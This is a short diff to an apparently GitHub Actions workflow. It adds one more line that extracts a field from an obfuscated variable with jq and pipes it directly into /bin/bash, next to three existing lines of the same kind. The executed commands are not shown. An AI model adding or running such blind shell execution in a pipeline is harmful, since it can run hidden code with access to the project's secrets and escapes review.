@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$lvl008" | jq -r .xwihl1 | /bin/bash
           printf '%s' "$xdnd78" | jq -r .uwbu6 | /bin/bash
           printf '%s' "$ilz8799" | jq -r .r272 | /bin/bash
+          echo $bl89 | jq -r .wg97488 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
